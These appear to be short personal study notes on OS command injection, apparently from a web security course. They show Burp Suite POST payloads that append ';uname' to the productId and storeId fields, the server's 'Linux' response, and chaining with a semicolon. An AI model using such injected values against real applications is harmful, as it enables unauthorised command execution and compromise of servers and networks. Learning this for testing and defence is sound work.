# Section 8: OS Command Injection

## Discovering a Basic Command Injection Vulnerability

**Execute system commands on the target web server**
- Compromise the application & server
- Compromise the network and other resources

  e.g. in a POST request payload, in BURP suite:

  ```
  productId=3;uname&storeId=2
  ```

  ```
  productId=3&storeId=2;uname
  ```

returns:
```
73
Linux
```

  added semicolon because I can run this in the system:

  ```
  uname;pwd
  ```

---
